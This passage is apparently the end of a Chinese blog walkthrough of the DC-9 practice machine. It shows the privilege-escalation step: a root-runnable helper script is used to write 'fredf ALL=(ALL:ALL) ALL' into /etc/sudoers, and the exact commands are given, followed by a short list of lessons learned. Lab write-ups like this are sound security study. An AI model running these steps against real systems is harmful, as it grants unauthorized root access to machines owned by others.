+<p>发现执行该二进制文件后，它跟我说了一个python文件的用法<code>test.py</code>，那么我们应该找到该文件，才能进行进一步的功能使用；那么其实也意味着该二进制文件应该是由该test.py文件编译出来的，我们先查看源码，了解该二进制文件的功能</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name test.py 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281846891.png" srcset="/img/loading.gif" lazyload alt="image-20240628184634851"></p>
+<blockquote>
+<p>根据输出结果我们比较容易能够确认该test.py文件应该是<code>/opt/devstuff/test.py</code>，因为跟二进制文件在同一目录下</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /opt/devstuff/test.py<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281847738.png" srcset="/img/loading.gif" lazyload alt="image-20240628184747690"></p>
+<p>根据源码可知，该<code>test.py</code>文件的作用是读取第一个参数地址的文件内容，写入到第二个参数地址文件中</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法</a></p>
+<p>通过对<code>sudoers</code>文件的了解，我们可以修改某一个用户的<code>sudo</code>命令的执行权限进行获取root权限</p>
+<p>首先，我们创建一个文件并写入内容，然后通过具有root权限的可执行的二进制文件写入到<code>/etc/sudoers</code>文件中，实现对用户权限的获取</p>
+<p>创建一个临时文件写入内容<code>fredf   ALL=(ALL:ALL) ALL</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /tmp/test<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;fredf   ALL=(ALL:ALL) ALL&quot;</span> &gt; /tmp/test<br>sudo ./test /tmp/test /etc/sudoers<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282011166.png" srcset="/img/loading.gif" lazyload alt="image-20240628201147118"></p>
+<p>从而获得了执行sudo的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282013314.png" srcset="/img/loading.gif" lazyload alt="image-20240628201323268"></p>
+<p>因而拥有了root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282012959.png" srcset="/img/loading.gif" lazyload alt="image-20240628201237917"></p>
+<p>从而靶场也是成功通过啦！！！！</p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol>
+<li>一些比较新颖的安全保护方案需要进一步的学习了解，比如今天学到的端口敲门保护方案</li>
+<li>存在一些隐藏的文件夹不能够被直接看到可以通过ls命令的<code>-a</code>参数去查看</li>
+<li>对于具有root权限的可执行文件需要格外注意，可能可以利用</li>
+<li>对于一些linux系统的权限文件需要重点学习和关注，学会利用它们进行权限的获取</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" class="category-chain-item">渗透学习</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web%E6%94%BB%E9%98%B2/" class="print-no-link">#web攻防</a>
+      
+        <a href="/tags/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/" class="print-no-link">#打靶日记</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83/" class="print-no-link">#提权</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>dc-9打靶日记</div>
+      <div>http://candyb0x.github.io/2024/06/28/dc-9打靶日记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年8月17日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/29/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8knockd/" title="端口敲门knockd">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">端口敲门knockd</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/22/dc-8%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/" title="dc-8打靶日记">
+                        <span class="hidden-mobile">dc-8打靶日记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
